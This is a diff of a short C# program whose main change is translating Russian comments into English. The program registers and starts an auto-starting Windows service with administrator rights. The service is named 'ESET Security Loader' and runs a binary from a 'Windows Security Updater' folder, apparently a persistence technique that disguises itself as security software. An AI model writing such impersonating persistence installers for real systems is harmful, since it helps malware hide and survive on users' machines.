@@ -1,13 +1,14 @@
-﻿using System;
+using System;
 using System.ServiceProcess;
 using System.Diagnostics;
+
 namespace MyApplicationNamespace
 {
     class Program
     {
         static void Main(string[] args)
         {
-            // Проверяем, был ли уже установлен наш сервис
+            // Check if the service is already installed
             ServiceController[] services = ServiceController.GetServices();
             bool serviceExists = false;
             foreach (ServiceController service in services)
@@ -19,20 +20,20 @@ namespace MyApplicationNamespace
                 }
             }
 
-            // Если сервис не был установлен, то создаем его
+            // If the service is not installed, create it
             if (!serviceExists)
             {
                 string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                 path += "\\Windows Security Updater\\ZWCxService.exe";
                 ProcessStartInfo processInfo = new ProcessStartInfo();
                 processInfo.FileName = "sc";
-                processInfo.Arguments = "create \"ESET Security Loader\" binPath= \""+ path + "\" start= auto"; // Запускать службу автоматически
-                processInfo.Verb = "runas"; // Запустить от имени администратора
+                processInfo.Arguments = "create \"ESET Security Loader\" binPath= \"" + path + "\" start= auto"; // Start the service automatically
+                processInfo.Verb = "runas"; // Run as administrator
 
                 ProcessStartInfo processInfoStart = new ProcessStartInfo();
                 processInfoStart.FileName = "sc";
-                processInfoStart.Arguments = "start \"ESET Security Loader\""; // Запускать службу автоматически
-                processInfoStart.Verb = "runas"; // Запустить от имени администратора
+                processInfoStart.Arguments = "start \"ESET Security Loader\""; // Start the service
+                processInfoStart.Verb = "runas"; // Run as administrator
                 try
                 {
                     Process.Start(processInfo);
